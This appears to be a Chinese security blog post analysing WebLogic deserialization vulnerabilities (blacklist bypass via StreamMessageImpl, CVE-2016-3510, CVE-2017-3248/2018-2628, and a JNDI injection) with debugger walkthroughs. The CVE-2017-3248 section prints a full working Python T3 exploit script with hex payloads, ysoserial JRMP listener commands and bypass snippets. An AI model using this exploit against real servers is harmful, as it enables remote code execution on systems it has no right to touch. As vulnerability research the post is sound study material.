+<p><a target="_blank" rel="noopener" href="https://github.com/QAX-A-Team/WeblogicEnvironment/issues/10">https://github.com/QAX-A-Team/WeblogicEnvironment/issues/10</a></p>
+<p>如果遇到libnsl问题，修改dockerfile为如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 参数</span><br><span class="line">ARG JDK_PKG</span><br><span class="line">ARG WEBLOGIC_JAR</span><br><span class="line"></span><br><span class="line">RUN cd /etc/yum.repos.d/</span><br><span class="line">RUN sed -i &#x27;s/mirrorlist/#mirrorlist/g&#x27; /etc/yum.repos.d/CentOS-*</span><br><span class="line">RUN sed -i &#x27;s|#baseurl=http://mirror.centos.org|baseurl=http://vault.centos.org|g&#x27; /etc/yum.repos.d/CentOS-*</span><br><span class="line">RUN curl -o /etc/yum.repos.d/CentOS-Base.repo https://mirrors.aliyun.com/repo/Centos-vault-8.5.2111.repo</span><br><span class="line">RUN yum clean all</span><br><span class="line">RUN yum makecache</span><br><span class="line"># 解决libnsl包丢失的问题</span><br><span class="line">RUN yum -y install libnsl</span><br></pre></td></tr></table></figure>
+
+<p>后面补丁搭建参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/nice0e3/p/14207435.html">https://www.cnblogs.com/nice0e3/p/14207435.html</a></p>
+<p>最后重启使用如下命令：<code>docker restart fed2d68045d8</code></p>
+<p>在修复代码处打个断点，开始调试</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240121192909220.png" alt="image-20240121192909220"></p>
+<p>跟进</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240121193028421-17058366322392.png" alt="image-20240121193028421"></p>
+<p>这个类还有个静态代码块，由于它是优先执行，所以我们先移步至static</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240121195524966.png" alt="image-20240121195524966"></p>
+<p>先是进行了两个if判断，我们来看看这两个方法</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240121195725297.png" alt="image-20240121195725297"></p>
+<p>分别判断了是否有disableblacklist和disabledefaultblacklist类</p>
+<p>进行完这两个判断之后，会调用updateBlackList方法</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240121200247247-17058385679184.png" alt="image-20240121200247247"></p>
+<p>就是将传入的参数添加进HashSet黑名单，黑名单列表如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+org.apache.commons.collections.functors,</span><br><span class="line">+com.sun.org.apache.xalan.internal.xsltc.trax,</span><br><span class="line">+javassist,+org.codehaus.groovy.runtime.ConvertedClosure,</span><br><span class="line">+org.codehaus.groovy.runtime.ConversionHandler,</span><br><span class="line">+org.codehaus.groovy.runtime.MethodClosure</span><br></pre></td></tr></table></figure>
+
+<p>回到isBlackListed方法，继续向下走，由于sun.reflect.annotation.AnnotationInvocationHandler类不在黑名单中，来到else语句</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240121200823197.png" alt="image-20240121200823197"></p>
+<p><code>lastIndexOf(46)</code> 是获取最后一个点号的索引位置，即获取包名，接下来就是对包名进行一个黑名单过滤</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240121201200584.png" alt="image-20240121201200584"></p>
+<p>如果存在，那么返回true，resolveClass方法抛出异常，在利用链中，当尝试对org.apache.commons.collections.functors.ChainedTransformer类进行对象变换时，由于这个类在黑名单中，所以会抛出异常</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240121202028413.png" alt="image-20240121202028413"></p>
+<h4 id="绕过工具分析"><a href="#绕过工具分析" class="headerlink" title="绕过工具分析"></a>绕过工具分析</h4><p>我们使用<a target="_blank" rel="noopener" href="https://github.com/5up3rc/weblogic_cmd%E5%B7%A5%E5%85%B7%E8%BF%9B%E8%A1%8C%E7%BB%95%E8%BF%87%E8%B0%83%E8%AF%95">https://github.com/5up3rc/weblogic_cmd工具进行绕过调试</a></p>
+<p>使用jdk6，并手动导入Tools.jar，编写配置</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240122093349005.png" alt="image-20240122093349005"></p>
+<p>在Main类中打上断点，开始调试</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240122093453474.png" alt="image-20240122093453474"></p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240122175526672.png" alt="image-20240122175526672"></p>
+<p>步入</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240122175627767-17059173889077.png" alt="image-20240122175627767"></p>
+<p>获取-C参数的值，并传入WebLogicOperation.blindExecute方法</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240122175732436.png" alt="image-20240122175732436"></p>
+<p>先判断服务器类型，然后调用SerialDataGenerator.serialBlindDatas方法，此方法为payload的生成方法，我们跟进</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240122180220341.png" alt="image-20240122180220341"></p>
+<p>调用blindExecutePayloadTransformerChain方法</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240122180531272.png" alt="image-20240122180531272"></p>
+<p>cc链的代码，没什么好说的，return，跟进serialData方法</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240122180650320.png" alt="image-20240122180650320"></p>
+<p>下面就是cc1链的内容，接着会步入到BypassPayloadSelector.selectBypass方法</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240122180846840.png" alt="image-20240122180846840"></p>
+<p>跟进</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240122180940387.png" alt="image-20240122180940387"></p>
+<p>进入else语句，调用Serializables.serialize方法</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240122181119939.png" alt="image-20240122181119939"></p>
+<p>返回一个ObjectOutputStream序列化对象，然后回到前一个点，将其传入streamMessageImpl方法</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240122182020685.png" alt="image-20240122182020685"></p>
+<p>将序列化对象转储到streamMessage对象中，回到这里</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240122182323792.png" alt="image-20240122182323792"></p>
+<p>对streamMessage对象又进行了一次序列化操作，最后将其返回，并将其用T3协议发送</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240122182444034.png" alt="image-20240122182444034"></p>
+<h4 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>漏洞原理如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">将反序列化的对象封装进了 StreamMessageImpl，然后再对 StreamMessageImpl 进行序列化，生成 payload 字节码。反序列化时 StreamMessageImpl 不在 WebLogic 黑名单里，可正常反序列化，在反序列化时 StreamMessageImpl 对象调用 readObject 时对 StreamMessageImpl 封装的序列化对象再次反序列化，这样就逃过了黑名单的检查。</span><br></pre></td></tr></table></figure>
+
+<p>在此先再来思考一个问题，<code>weblogic.jms.common.StreamMessageImpl#readExternal()</code>该方法是怎么被调用的呢？在前面分析原生<code>readObject</code>方法的时候发现，其实<code>readObject</code>方法的底层还会去调用很多其他方法。</p>
+<p>在Weblogic从流量中的序列化类字节段通过readClassDesc-readNonProxyDesc-resolveClass获取到普通类序列化数据的类对象后，程序依次尝试调用类对象中的readObject、readResolve、readExternal等方法。而在这里<code>readExternal</code>就会被调用。</p>
+<p>我们依旧在resolveClass处下个断点，然后工具发送payload</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240122183440735.png" alt="image-20240122183440735"></p>
+<p>可以看到接收到的是StreamMessageImpl对象了，不在黑名单中，我们在readExternal方法中下个断点就能窥探这个方法是如何被调用的了</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240122184250703.png" alt="image-20240122184250703"></p>
+<p>由于这里调用的是原生的readObject，所以也不会被补丁所修改的resloveClass所限制，命令执行成功</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240122184709989.png" alt="image-20240122184709989"></p>
+<h2 id="另一种绕过（CVE-2016-3510）"><a href="#另一种绕过（CVE-2016-3510）" class="headerlink" title="另一种绕过（CVE-2016-3510）"></a>另一种绕过（CVE-2016-3510）</h2><p>和上一个漏洞差不多，就是利用MarshalledObject的readResolve方法</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240119204728032.png" alt="image-20240119204728032"></p>
+<h2 id="CVE-2017-3248-CVE-2018-2628"><a href="#CVE-2017-3248-CVE-2018-2628" class="headerlink" title="CVE-2017-3248 &amp; CVE-2018-2628"></a>CVE-2017-3248 &amp; CVE-2018-2628</h2><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>这个漏洞会使用底层JRMP向指定的JRMP服务端发起一个连接，而我们可以伪造一个服务端，向客户端返回一个恶意对象，客户端收到这个恶意对象后反序列化造成命令执行。</p>
+<p>具体受影响的Weblogic 版本列表如下：</p>
+<p>12.1.2</p>
+<p>12.1.2.0</p>
+<p>12.1.3</p>
+<p>12.1.3.0</p>
+<p>12.2.1</p>
+<p>12.2.1.0</p>
+<p>12.2.1.1</p>
+<p>12.2.1.2</p>
+<p>10.3.6</p>
+<p>10.3.6.0</p>
+<p>本机开启JRMP服务端 -》利用T3协议发送payload使得weblogic反序列化后，开启JRMP客户端，并连接服务端 -》服务端发送exp给客户端，客户端上的DGC接收到响应即会反序列化。</p>
+<h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p><strong>使用ysoserial开启一个JRMP服务端监听：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 1234 CommonsCollections1 &quot;calc&quot;</span><br></pre></td></tr></table></figure>
+
+<p><strong>利用T3协议发送payload&#x2F;JRMPClient：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 test.py 127.0.0.1 7001 ysoserial.jar 127.0.0.1 1234 JRMPClient</span><br></pre></td></tr></table></figure>
+
+<p>test.py</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">from __future__ import print_function</span><br><span class="line"></span><br><span class="line">import binascii</span><br><span class="line">import os</span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def generate_payload(path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client):</span><br><span class="line">    #generates ysoserial payload</span><br><span class="line">    command = &#x27;java -jar &#123;&#125; &#123;&#125; &#123;&#125;:&#123;&#125; &gt; payload.out&#x27;.format(path_ysoserial, jrmp_client, jrmp_listener_ip, jrmp_listener_port)</span><br><span class="line">    print(&quot;command: &quot; + command)</span><br><span class="line">    os.system(command)</span><br><span class="line">    bin_file = open(&#x27;payload.out&#x27;,&#x27;rb&#x27;).read()</span><br><span class="line">    return binascii.hexlify(bin_file)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def t3_handshake(sock, server_addr):</span><br><span class="line">    sock.connect(server_addr)</span><br><span class="line">    sock.send(&#x27;74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a&#x27;.decode(&#x27;hex&#x27;))</span><br><span class="line">    time.sleep(1)</span><br><span class="line">    sock.recv(1024)</span><br><span class="line">    print(&#x27;handshake successful&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def build_t3_request_object(sock, port):</span><br><span class="line">    data1 = &#x27;000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371&#x27;</span><br><span class="line">    data2 = &#x27;007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000&#123;0&#125;ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07&#x27;.format(&#x27;&#123;:04x&#125;&#x27;.format(dport))</span><br><span class="line">    data3 = &#x27;1a7727000d3234322e323134&#x27;</span><br><span class="line">    data4 = &#x27;2e312e32353461863d1d0000000078&#x27;</span><br><span class="line">    for d in [data1,data2,data3,data4]:</span><br><span class="line">        sock.send(d.decode(&#x27;hex&#x27;))</span><br><span class="line">    time.sleep(2)</span><br><span class="line">    print(&#x27;send request payload successful,recv length:%d&#x27;%(len(sock.recv(2048))))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def send_payload_objdata(sock, data):</span><br><span class="line">    payload=&#x27;056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000&#x27;</span><br><span class="line">    payload+=data</span><br><span class="line">    payload+=&#x27;fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff&#x27;</span><br><span class="line">    payload = &#x27;%s%s&#x27;%(&#x27;&#123;:08x&#125;&#x27;.format(len(payload)/2 + 4),payload)</span><br><span class="line">    sock.send(payload.decode(&#x27;hex&#x27;))</span><br><span class="line">    time.sleep(2)</span><br><span class="line">    sock.send(payload.decode(&#x27;hex&#x27;))</span><br><span class="line">    res = &#x27;&#x27;</span><br><span class="line">    try:</span><br><span class="line">        while True:</span><br><span class="line">            res += sock.recv(4096)</span><br><span class="line">            time.sleep(0.1)</span><br><span class="line">    except Exception:</span><br><span class="line">        pass</span><br><span class="line">    return res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def exploit(dip, dport, path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client):</span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    sock.settimeout(65)</span><br><span class="line">    server_addr = (dip, dport)</span><br><span class="line">    t3_handshake(sock, server_addr)</span><br><span class="line">    build_t3_request_object(sock, dport)</span><br><span class="line">    payload = generate_payload(path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client)</span><br><span class="line">    print(&quot;payload: &quot; + payload)</span><br><span class="line">    rs=send_payload_objdata(sock, payload)</span><br><span class="line">    print(&#x27;response: &#x27; + rs)</span><br><span class="line">    print(&#x27;exploit completed!&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__==&quot;__main__&quot;:</span><br><span class="line">    #check for args, print usage if incorrect</span><br><span class="line">    if len(sys.argv) != 7:</span><br><span class="line">        print(&#x27;\nUsage:\nexploit.py [victim ip] [victim port] [path to ysoserial] &#x27;</span><br><span class="line">              &#x27;[JRMPListener ip] [JRMPListener port] [JRMPClient]\n&#x27;)</span><br><span class="line">        sys.exit()</span><br><span class="line"></span><br><span class="line">    dip = sys.argv[1]</span><br><span class="line">    dport = int(sys.argv[2])</span><br><span class="line">    path_ysoserial = sys.argv[3]</span><br><span class="line">    jrmp_listener_ip = sys.argv[4]</span><br><span class="line">    jrmp_listener_port = sys.argv[5]</span><br><span class="line">    jrmp_client = sys.argv[6]</span><br><span class="line">    exploit(dip, dport, path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ilikeoyt.github.io/image/image-20240131134124093.png" alt="image-20240131134124093"></p>
+<h4 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>payload利用RemoteObjectInvocationHandler代理类封装UnicastRef对象（用于连接监听端），在反序列化时，首先会调用RemoteObjectInvocationHandler的readObject方法，但由于RemoteObjectInvocationHandler没有readObject方法，便会尝试调用其父类RemoteObject的readObject方法</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240131142223973.png" alt="image-20240131142223973"></p>
+<p>这中间主要是实例化了一个UnicastRef对象，并调用其readExternal方法</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240131143358737.png" alt="image-20240131143358737"></p>
+<p>跟进</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240131143845958.png" alt="image-20240131143845958"></p>
+<p>调用LiveRef的read方法</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240131143958492.png" alt="image-20240131143958492"></p>
+<p>对一些基本的JRMP连接信息进行了配置，最后会到这里</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240131144432243.png" alt="image-20240131144432243"></p>
+<p>尝试与监听端建立TCP连接，跟进</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240131144748528.png" alt="image-20240131144748528"></p>
+<p>接着调用EndpointEntry的registerRefs方法</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240131145201198.png" alt="image-20240131145201198"></p>
+<p>向注册中心注册 <code>LiveRef</code> 对象，并在注册完成后执行一些清理操作，说白了LiveRef对象就是监听端的ip和端口信息，注册完成后会调用makeDirtyCall方法</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240131145406252.png" alt="image-20240131145406252"></p>
+<p>跟进</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240131145535058.png" alt="image-20240131145535058"></p>
+<p>调用this.dgc.dirty方法，其中this.dgc为DGCImpl_Stub对象</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240131145652227.png" alt="image-20240131145652227"></p>
+<p>然后调用UnicastRef的invoke方法</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240131150031769.png" alt="image-20240131150031769"></p>
+<p>调用StreamRemoteCall的executeCall方法</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240131150359262.png" alt="image-20240131150359262"></p>
+<p>这个方法里面会调用到原生的readObject方法，从而触发我们的调用链</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240131150555125.png" alt="image-20240131150555125"></p>
+<h4 id="补丁分析及绕过"><a href="#补丁分析及绕过" class="headerlink" title="补丁分析及绕过"></a>补丁分析及绕过</h4><p>一般反序列操作防御resolveProxyClass和resolveClass方法重写，进行黑名单匹配，这个补丁就是重写了resolveProxyClass，对 RMI 接口类型进行了判断，判断 RMI 接口是否为<code>java.rmi.registry.Registry</code>，是的话抛出错误。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">protected Class&lt;?&gt; resolveProxyClass(String[] interfaces) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">            String[] arr$ = interfaces;</span><br><span class="line">            int len$ = interfaces.length;</span><br><span class="line"></span><br><span class="line">            for(int i$ = 0; i$ &lt; len$; ++i$) &#123;</span><br><span class="line">                String intf = arr$[i$];</span><br><span class="line">                if (intf.equals(&quot;java.rmi.registry.Registry&quot;)) &#123;</span><br><span class="line">                    throw new InvalidObjectException(&quot;Unauthorized proxy deserialization&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            return super.resolveProxyClass(interfaces);</span><br></pre></td></tr></table></figure>
+
+<p>绕过方法1：直接去去掉Proxy，走resolveClass方法即可</p>
+<p>绕过方法2：将接口接口由registry改为Activator（CVE-2018-2628）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Object object = Proxy.newProxyInstance(JRMPClient2.class.getClassLoader(), new Class[] &#123; Activator.class &#125;, remoteObjectInvocationHandler);</span><br></pre></td></tr></table></figure>
+
+<p>利用方法将发送的序列化请求改为JRMPClient2即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 2017-3248.py 127.0.0.1 7001 ysoserial.jar 127.0.0.1 9999 JRMPClient2</span><br></pre></td></tr></table></figure>
+
+<p>绕过方法3：用streamMessageImpl对remoteObjectInvocationHandler做一次封装</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Object object = Proxy.newProxyInstance(JRMPClient.class.getClassLoader(), new Class[] &#123; Registry.class &#125;, remoteObjectInvocationHandler);</span><br><span class="line">return streamMessageImpl(Serializer.serialize(object));</span><br></pre></td></tr></table></figure>
+
+<h2 id="CVE-2018-2191"><a href="#CVE-2018-2191" class="headerlink" title="CVE-2018-2191"></a>CVE-2018-2191</h2><p>主要是利用JtaTransactionManager中的lookup方法参数可控，导致反序列化该类之后发生了JNDI注入</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240131163937705.png" alt="image-20240131163937705"></p>
+<p>跟进initUserTransactionAndTransactionManager方法</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240131164121158.png" alt="image-20240131164121158"></p>
+<p>传入lookupUserTransaction方法的参数userTransactionName是可以通过setter方法进行赋值的</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240131164105160.png" alt="image-20240131164105160"></p>
+<p>继续看看lookupUserTransaction方法</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240131164219477.png" alt="image-20240131164219477"></p>
+<p>可控的lookup方法触发JNDI注入</p>
+<p><a target="_blank" rel="noopener" href="https://ilikeoyt.github.io/2024/01/16/java-sql%E6%B3%A8%E5%85%A5/"> java–sql注入</a></p>
+<p><a target="_blank" rel="noopener" href="https://ilikeoyt.github.io/2024/04/17/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/">Windows权限维持 </a></p>
+<p>© 2024 ycxlo</p>
+<p>Powered by <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> &amp; <a target="_blank" rel="noopener" href="https://muse.theme-next.org/">NexT.Muse</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2024/01/16/java-sql%E6%B3%A8%E5%85%A5/" rel="prev" title="java--sql注入">
+      <i class="fa fa-chevron-left"></i> java--sql注入
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2024/04/17/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" rel="next" title="Windows权限维持">
+      Windows权限维持 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
